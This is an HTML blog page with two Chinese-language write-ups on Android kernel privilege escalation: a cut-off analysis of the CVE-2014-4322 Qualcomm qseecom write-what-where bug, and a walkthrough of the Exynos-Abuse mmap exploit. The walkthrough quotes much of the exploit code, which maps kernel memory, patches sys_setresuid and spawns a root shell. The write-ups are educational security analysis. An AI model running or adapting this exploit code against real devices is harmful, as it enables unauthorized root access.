<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
<title>ShenYuanV's White Paper for Security</title>
<meta name="description" content="ShenYuanV's White Paper for Security">


<meta property="og:type" content="article">
<meta property="og:title" content="A guide to your digital life &#8211; ">
<meta property="og:description" content="ShenYuanV's White Paper for Security">
<meta property="og:url" content="http://vinitkumar.me/white-paper/">
<meta property="og:site_name" content="">

<!-- Webmaster Tools verfication -->




<link rel="canonical" href="http://vinitkumar.me/white-paper/">
<link href="http://vinitkumar.me/white-paper/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">

<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="stylesheet" href="http://vinitkumar.me/white-paper/css/base.min.css" type="text/css" />
<link rel="stylesheet" href="http://vinitkumar.me/white-paper/css/github.min.css" type="text/css" />
<link rel="stylesheet" href="http://vinitkumar.me/white-paper/css/octicons.css" type="text/css" />
<link href='http://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>

</head>
<body>
  <div class="header-container">
  <header>
      <ul class="nav">
        <!--Change the  URL here if working on an absolute domain-->
        <li><a href=""><span class="mega-octicon octicon-terminal" style="margin-right: 6px;"></span>White Paper</a></li>
        <li><a href="/about"><span class="mega-octicon octicon-person" style="margin-right: 6px;"></span>About</a></li>
      </ul>
  </header>
  <!--<script data-gratipay-username="vinitkme" data-gratipay-widget="button" src="//grtp.co/v1.js"></script>-->
</div>

  <div class="container">
    <p class="intro">
      ShenYuanV's White Paper.
    </p>
  <div class="listing">
    
    <div class="post other link">
      <h2><span class="mega-octicon octicon-flame" style="min-width: 32px;"></span><a href="/2015/04/21/how_to_exploit_write_what_where_ret2usr.html">How to exploit Write-what-where by using ret2usr</a></h2>
      <p class="post-date">21 Apr 2015</p>

      <p><h1>How to exploit Write-what-where by using ret2usr - CVE-2014-4322</h1>

<h2>CVE-2014-4322&amp;ret2usr</h2>

<h1>漏洞成因</h1>

<p>CVE-2014-4322是2014年12月底公布的Android高通驱动漏洞，漏洞的原因官方描述为：&quot;<strong>The qseecom driver provides an ioctl system call interface to user space clients for communication. When processing this communication, the __qseecom_update_cmd_buf function uses the user-supplied value cmd_buf_offset as an index to a buffer for write operations without any boundary checks, allowing a local application with access to the qseecom device node to, e.g., escalate privileges.</strong>&quot;
简单来说就是ioctl调用时没有检查传入的参数就直接改变该指针指向的值，导致可以更改任意内存。
XDA论坛的“zxz0O0”将此漏洞利用后开发出了GIEFROOT提权工具，本篇文档将会从提权利用的角度来分析此漏洞。</p>

<h1>漏洞细节</h1>

<p><a href="https://us.codeaurora.org/cgit/quic/la/kernel/msm-3.10/tree/drivers/misc/qseecom.c?h=APSS.FSM4.1.0&amp;id=60db6b16517d6a8ab96d6760b8e1df7fe7ae1c71">漏洞代码</a>
漏洞是处在ioctl接口中的
<strong>QSEECOM_IOCTL_SEND_MODFD_CMD_REQ</strong>部分，在这个分支中调用的<strong>qseecom_send_modfd_cmd</strong>函数没有对地址进行合法性检查直接对传入的指针进行赋值。</p>
<figure class="highlight"><pre><code class="language-c" data-lang="c">uint32_t *update;
update = (uint32_t *) field;
if (cleanup)
    *update = 0;
else
    *update = (uint32_t)sg_dma_address(sg_ptr-&gt;sgl);
len += (uint32_t)sg-&gt;length;
</code></pre></figure>
<p>简单说,这个漏洞能造成的后果就是:<strong>用户空间可以将任意地址(内核空间以及用户空间)的值设置为任意值</strong>.</p>

<h1>利用思路</h1>

<p>这是一个典型的任意地址写漏洞,这类漏洞的思路可以简化为:
*寻找进程credential地址
*修改进程credential中自身的uid以及能力</p>

<h1>具体案例</h1>

<p><a href="https://github.com/retme7/CVE-2014-4322_poc">exploit by retme7</a>
1、打开驱动、更改进程名
有漏洞的驱动位于/dev/qseecom，首先需要打开这个驱动文件对它进行操作，第一个值得注意的地方是exploit一开始就调用了prctl更改自己的进程名，这个举动的目的是让后面的程序更容易定位特定内存位置。</p>
<figure class="highlight"><pre><code class="language-c" data-lang="c">prctl(PR_SET_NAME, &quot;ihoo.darkytools&quot;, 0, 0, 0);
</code></pre></figure>
<p>2、调用QSEECOM_IOCTL_SET_MEM_PARAM_REQ传入共享内存句柄以及shellcode内存地址</p>
</p>
    </div>
    
    <div class="post other link">
      <h2><span class="mega-octicon octicon-flame" style="min-width: 32px;"></span><a href="/2014/03/14/privilege_escalation_in_kernel_101_mmap.html">Privilege Escalation in Kernel 101 - mmap</a></h2>
      <p class="post-date">14 Mar 2014</p>

      <p><h1>Privilege Escalation 101</h1>

<h2>mmap&amp;remap_pfn_range</h2>

<h1>漏洞成因</h1>

<p>在一段时期,各个厂商经常出现的漏洞中其中之一就是通过mmap控制全部物理内存.而出现这个问题的原因就是驱动开发人员没有正确地对remap_pfn_range这个函数中的参数做处理.
<a href="http://linux.die.net/man/2/mmap">mmap man page</a>
<a href="http://www.makelinux.net/ldd3/chp-15-sect-2">remap_pfn_range 使用方法</a>
下面是mmap的linux API,它的作用是将指定地址和大小的内存映射到用户空间中以便程序进行内存操作,offset传入需要映射的物理地址偏移,length传入需要映射的长度.</p>
<figure class="highlight"><pre><code class="language-c" data-lang="c">void *mmap(void *addr, size_t length, int prot, int flags,
           int fd, off_t offset);
</code></pre></figure>
<p><strong>The mmap function asks to map length bytes starting  at offset  offset from  the  file  (or  other object) specified by the file descriptor fd into memory, preferably at address start.  This  latter  address  is  a hint  only,  and is usually specified as 0.  The actual place where the object is mapped is returned by mmap, and is never 0.</strong></p>

<p>mmap是用户空间对内核请求映射内存的一个接口,调用这个接口后如果相关驱动支持此操作,会实现一个响应mmap的函数,一般情况下会在这个响应函数中调用remap_pfn_range,下面是linux man page上对remap_pfn_range的一个简单示例：</p>
<figure class="highlight"><pre><code class="language-c" data-lang="c">static int simple_remap_mmap(struct file *filp, struct vm_area_struct *vma)
{
    if (remap_pfn_range(vma, vma-&gt;vm_start, vm-&gt;vm_pgoff,
                vma-&gt;vm_end - vma-&gt;vm_start,
                vma-&gt;vm_page_prot))
        return -EAGAIN;

    vma-&gt;vm_ops = &amp;simple_remap_vm_ops;
    simple_vma_open(vma);
    return 0;
}
</code></pre></figure>
<p>如果这段代码被直接用到驱动上,问题就来了,因为vma中的参数是根据用户空间调用mmap时传入的参数构造而成.用户空间可以传入内核代码段的物理地址,并将其标识为可读写,从而修改内核空间的代码.</p>

<h1>保护机制</h1>

<p>一个程序的内存空间可以分为两个部分,用户空间（user space）、内核空间（kernel space）,在正常情况下,操作系统中运行的程序只能够控制自身用户空间的内存,而内核空间是由操作系统控制,且运行在特权模式.一个程序的凭据（credential）保存了自身uid、权限等信息,而凭据储存在内核空间,所以运行在用户空间的普通程序无法修改自身的凭据,这就是linux的权限控制的一部分,它保证了操作系统的安全性.</p>
<figure class="highlight"><pre><code class="language-text" data-lang="text">|--------------|
| kernel space |
|--------------|
| user space   |
|--------------|
</code></pre></figure>
<h2>获取全部物理地址的操作能力后提权思路</h2>

<p>由于系统中存在能够在用户空间操作所有内存（包括内核地址内存）时,普通程序通过修改内核代码段的机器码即可让内核执行任意命令,从而达到提权的目的.</p>

<h1>具体案例Exynos-Abuse</h1>

<p>Exynos-Abuse是其中一个最典型的案例,而且这个漏洞的利用代码也早早地公布了出来,从公布的利用代码来对这类漏洞的利用方式进行分析是最有效的方法.
<a href="https://raw.githubusercontent.com/mwrlabs/mercury-modules/master/metall0id/root/exynosmem/exynos-abuse/jni/exynos-abuse.c">Exynos-Abuse完整利用代码</a></p>

<h2>获取全部物理地址的操作能力</h2>

<p>根据之前介绍过的一样,这个漏洞的利用方式第一步就是<strong>获取全部物理地址的操作能力</strong>,也就是下面这段代码做的工作：
程序打开有漏洞的驱动后,通过mmap调用了内存映射的方法,参数中length和PHYS_OFFSET是至关重要的两个参数.</p>
<figure class="highlight"><pre><code class="language-c" data-lang="c">  #define PHYS_OFFSET 0x40000000
    ......
  int page_size = sysconf(_SC_PAGE_SIZE);
  int length = page_size * page_size;
    ......
    /* open the door */
  fd = open(&quot;/dev/exynos-mem&quot;, O_RDWR);//打开有漏洞的驱动
  if (fd == -1) {
    printf(&quot;[!] Error opening /dev/exynos-mem\n&quot;);
    exit(1);
  }

    /* kernel reside at the start of physical memory, so take some Mb */
  paddr = (unsigned long *)mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_SHARED, fd, PHYS_OFFSET);//调用驱动的mmap对应接口,传入kernel text的起始物理地址
  tmp = paddr;
  if (paddr == MAP_FAILED) {
     printf(&quot;[!] Error mmap: %s|%08X\n&quot;,strerror(errno), i);
     exit(1);
  }
</code></pre></figure>
<p>要定位到想要修改的函数地址就需要获取内核符号表,一般情况下在执行打印内核符号表的函数时由于/proc/sys/kptr_restrict的限制,所有符号表地址都会打印为0,.在内核数据段中寻找字符串&quot;%pK %c %s\n&quot;,并将其修改为&quot;%p %c %s\n&quot;,可以绕过此限制将内核函数的正确地址打印出来.</p>
<figure class="highlight"><pre><code class="language-c" data-lang="c">    /*
     * search the format string &quot;%pK %c %s\n&quot; in memory
     * and replace &quot;%pK&quot; by &quot;%p&quot; to force display kernel
     * symbols pointer
     修改内核符号表打印函数中的&quot;%pK %c %s\n&quot;,并将其修改为&quot;%p %c %s\n&quot;
     */
    for(m = 0; m &lt; length; m += 4) {
        if(*(unsigned long *)tmp == 0x204b7025 &amp;&amp; *(unsigned long *)(tmp+1) == 0x25206325 &amp;&amp; *(unsigned long *)(tmp+2) == 0x00000a73 ) {
            printf(&quot;[*] s_show-&gt;seq_printf format string found at: 0x%08X\n&quot;, PAGE_OFFSET + m);
            restore_ptr_fmt = tmp;
            *(unsigned long*)tmp = 0x20207025;//找到格式化字符串以后修改之
            found = true;
            break;
        }
        tmp++;
    }

    if (found == false) {
        printf(&quot;[!] s_show-&gt;seq_printf format string not found\n&quot;);
        exit(1);
    }
</code></pre></figure>
<p>拿到内核符号表后就可以定位需要修改的系统调用setresuid的地址了,查找地址的方法为读取/proc/kallsyms的值,修改上面的格式化字符串后再访问改文件时,获取到的地址已经是正确的内核地址.</p>
<figure class="highlight"><pre><code class="language-c" data-lang="c">    found = false;

    /* kallsyms now display symbols address */       
    kallsyms = fopen(&quot;/proc/kallsyms&quot;, &quot;r&quot;);
    if (kallsyms == NULL) {
        printf(&quot;[!] kallsysms error: %s\n&quot;, strerror(errno));
        exit(1);
    }

    /* parse /proc/kallsyms to find sys_setresuid address */
    while((ptr = fgets(line, 512, kallsyms))) {
        str = strtok(ptr, &quot; &quot;);
        addr_sym = strtoul(str, NULL, 16);
        index = 1;
        while(str) {
            str = strtok(NULL, &quot; &quot;);
            index++;
            if (index == 3) {
                if (strncmp(&quot;sys_setresuid\n&quot;, str, 14) == 0) {
                    printf(&quot;[*] sys_setresuid found at 0x%08X\n&quot;,addr_sym);
                    found = true;
                }
                break;
            }
        }
</code></pre></figure>
<p>找到setresuid的地址后开始搜索cmp r0,#0的机器码,找到后通过把setresuid中的cmp r0,#0,修改为cmp r0,#1将权限检查的逻辑取反.</p>
<figure class="highlight"><pre><code class="language-c" data-lang="c">        if (found) {
            tmp = paddr;
            tmp += (addr_sym - PAGE_OFFSET) &gt;&gt; 2;
            for(m = 0; m &lt; 128; m += 4) {
                if (*(unsigned long *)tmp == 0xe3500000) {
                    printf(&quot;[*] patching sys_setresuid at 0x%08X\n&quot;,addr_sym+m);
                    restore_ptr_setresuid = tmp;
                    *(unsigned long *)tmp = 0xe3500001;
                    break;
                }
                tmp++;
            }
            break;
        }
    }
</code></pre></figure>
<p>此时内核代码中setresuid的权限检查逻辑已经取反,之前没有权限执行setresuid的程序现在可以执行成功了.</p>
<figure class="highlight"><pre><code class="language-c" data-lang="c">    fclose(kallsyms);

    /* to be sure memory is updated */
    usleep(100000);

    /* ask for root */
    result = setresuid(0, 0, 0);

    /* restore memory */
    *(unsigned long *)restore_ptr_fmt = 0x204b7025;
    *(unsigned long *)restore_ptr_setresuid = 0xe3500000;
    munmap(paddr, length);
    close(fd);

    if (result) {
        printf(&quot;[!] set user root failed: %s\n&quot;, strerror(errno));
        exit(1);
    }

    /* execute a root shell */
    execve (cmd[0], cmd, env);

  return 0;
}
</code></pre></figure>
<p>当execve函数运行时该程序的uid已经设置为0,如果执行的命令为&quot;/system/bin/sh&quot;,将会看到命令行的用户由&quot;shell$&quot;变成了&quot;root#&quot;.</p>

<h1>小结</h1>

<p>以上的例子是在32位系统中没有开启内核代码只读的情况下才能够利用成功,由于攻防的演进,后面Android系统增加了很多诸如内核代码只读、PXN等安全功能,使得漏洞的完美利用更加困难,但通过此例子可以很好的了解内核提权的步骤以及思路.</p>
</p>
    </div>
    
</div>


  

<!-- Pagination links -->
<div class="pagination">
  
    <span class="next"><span class="mega-octicon octicon-playback-rewind" style="min-width: 32px;"></span></span>
  
  
    <span class="previous"><span class="mega-octicon octicon-playback-fast-forward" style="min-width: 32px;"></span></span>
  
</div>

<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', '']);
  _gaq.push(['_trackPageview']);
  (function() {
  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

  </div><!-- /.main -->
</body>
</html>